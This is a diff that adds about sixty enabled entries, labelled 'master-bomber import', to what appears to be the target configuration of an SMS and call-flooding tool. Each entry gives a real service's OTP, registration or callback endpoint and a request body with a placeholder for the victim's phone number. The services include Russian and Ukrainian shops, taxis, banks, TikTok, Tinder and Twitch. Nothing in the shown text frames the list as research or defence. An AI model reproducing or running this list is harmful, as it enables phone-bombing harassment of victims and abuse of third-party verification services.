+      "name": "mb2-70-tabasko.su",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://tabasko.su/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "LOGIN": "{digits}",
+        "ACTION": "GET_CODE",
+        "COMPONENT_NAME": "AUTH",
+        "IS_AJAX": "Y"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-71-www.tarantino-family.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "action": "callback_phonenumber"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-72-taxi-ritm.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "BACK_CALL_PHONE": "{digits}",
+        "RECALL": "Y"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-73-msk.tele2.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://msk.tele2.ru/api/validation/number/{digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-74-thehive.pro",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://thehive.pro/auth/signup",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-75-m.tiktok.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://m.tiktok.com/node/send/download_link",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-76-www.tvoyaapteka.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "tel": "{e164}",
+        "change_code": 1
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-77-uklon.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://uklon.com.ua/api/v1/account/code/send",
+      "enabled": true,
+      "countries": [],
+      "headers": {
+        "client_id": "6289de851fc726f887af8d5d7a56c635"
+      },
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-78-partner.uklon.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://partner.uklon.com.ua/api/v1/registration/sendcode",
+      "enabled": true,
+      "countries": [],
+      "headers": {
+        "client_id": "6289de851fc726f887af8d5d7a56c635"
+      },
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-79-my.dianet.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.dianet.com.ua/send_sms/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-80-app.doma.uchi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://app.doma.uchi.ru/api/v1/parent/signup_start",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-81-app.doma.uchi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://app.doma.uchi.ru/api/v1/parent/signup_start",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-82-b.utair.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://b.utair.ru/api/v1/login/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "login": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-83-pay.visa.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://pay.visa.ru/api/Auth/code/request",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phoneNumber": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-84-shop.vsk.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://shop.vsk.ru/ajax/auth/postSms/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-85-api.iconjob.co",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.iconjob.co/api/auth/verification_code",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-86-clients.cleversite.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://clients.cleversite.ru/callback/run.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "num": "{digits}",
+        "siteid": "62731",
+        "title": "Онлайн-консультант",
+        "referrer": "https://m.cleversite.ru/call"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-87-doc.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://doc.ua/main/callbackrequest",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "crm_models_SupportRequest[user_name]": "Ivan",
+        "crm_models_SupportRequest[user_phone]": "{digits}",
+        "crm_models_SupportRequest[link]": "https://doc.ua/doctors/kiev/all/psiholog"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-88-app.cloudloyalty.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://app.cloudloyalty.ru/demo/send-code",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-89-api.mtstv.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.mtstv.ru/v1/users",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-90-api.cian.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.cian.ru/sms/v1/send-validation-code/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-91-api.ennergiia.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.ennergiia.com/auth/api/development/lor",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-92-online.sbis.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://online.sbis.ru/reg/service/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-93-tehnosvit.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://tehnosvit.ua/iwantring_feedback.html",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "feedbackName": "Ivan",
+        "feedbackPhone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-94-www.nl.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.nl.ua",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "component": "bxmaker.authuserphone.login",
+        "sessid": "bf70db951f54b837748f69b75a61deb4",
+        "method": "sendCode",
+        "phone": "{digits}",
+        "registration": "N"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-95-moscow.rutaxi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://moscow.rutaxi.ru/ajax_keycode.html",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "1": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-96-api.tinkoff.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.tinkoff.ru/v1/sign_up",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-97-my.citrus.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.citrus.ua/api/v2/register",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "email": "test{ts}@mail.ru",
+        "name": "Ivan",
+        "phone": "{digits}",
+        "password": "!@#qwe",
+        "confirm_passwor": "!@#qwe"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-98-youla.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://youla.ru/web-api/auth/request_code",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-99-www.smsint.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "name": "Ivan",
+        "phone": "{digits}",
+        "promo": "yellowforma"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-100-lk.invitro.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-101-app.karusel.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://app.karusel.ru/api/v1/phone/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-102-app-api.kfc.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-103-terra-1.indriverapp.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://terra-1.indriverapp.com/api/authorization?locale=ru",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "mode": "request",
+        "phone": "{e164}",
+        "phone_permission": "unknown",
+        "stream_id": 0,
+        "v": 3,
+        "appversion": "3.20.6",
+        "osversion": "unknown",
+        "devicemodel": "unknown"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-104-lk.invitro.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "password": "Pac{code}!Aa",
+        "application": "lkp",
+        "login": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-105-ube.pmsm.org.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-106-api.ivi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-107-cloud.mail.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://cloud.mail.ru/api/v2/notify/applink",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-108-api.gotinder.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone_number": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-109-cabinet.wi-fi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
+      "enabled": true,
+      "countries": [],
+      "headers": {
+        "App-ID": "cabinet"
+      },
+      "body_type": "json",
+      "body": {
+        "msisdn": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-110-alpari.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
+      "enabled": true,
+      "countries": [],
+      "headers": {
+        "Referer": "https://alpari.com/en/registration/"
+      },
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-111-it.buzzolls.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://it.buzzolls.ru:9995/api/v2/auth/register?phoneNumber={e164}",
+      "enabled": true,
+      "countries": [],
+      "headers": {
+        "keywordapi": "ProjectVApiKeyword",
+        "usedapiversion": "3"
+      },
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-112-youla.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://youla.ru/web-api/auth/request_code",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-113-api-prime.anytime.global",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-114-kasta.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://kasta.ua/api/v2/login/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-115-app.benzuber.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://app.benzuber.ru/login",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-116-bamper.by",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://bamper.by/registration/?step=1",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}",
+        "submit": "Запросить смс подтверждения",
+        "rules": "on"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-117-707taxi.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://707taxi.com.ua/sendSMS.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "tel": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-118-protovar.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://protovar.com.ua/aj_record",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "object": "callback",
+        "user_name": "Ivan",
+        "contact_phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-119-e-vse.online",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://e-vse.online/mail2.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "object": "callback",
+        "user_name": "Ivan",
+        "contact_phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-120-protovar.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://protovar.com.ua/aj_record",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "telephone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-121-api.chef.yandex",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.chef.yandex/api/v2/auth/sms",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-122-passport.twitch.tv",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://passport.twitch.tv/register?trusted_request=true",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-123-api.sunlight.net",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.sunlight.net/v3/customers/authorization/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-124-register.sipnet.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone={e164}&callmode=1&oper=9",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-125-ok.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "st.r.phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-126-lenta.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://lenta.com/api/v1/authentication/requestValidationCode",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-127-guru.taxi",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://guru.taxi/api/v1/driver/session/verify",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-128-findclone.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://findclone.ru/register?phone={e164}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-129-api.delitime.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.delitime.ru/api/v2/signup",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "SignupForm[username]": "{digits}",
+        "SignupForm[device_type]": 3
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-130-api.carsmile.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.carsmile.com/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-131-api-prime.anytime.global",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
     }
   ]
 }
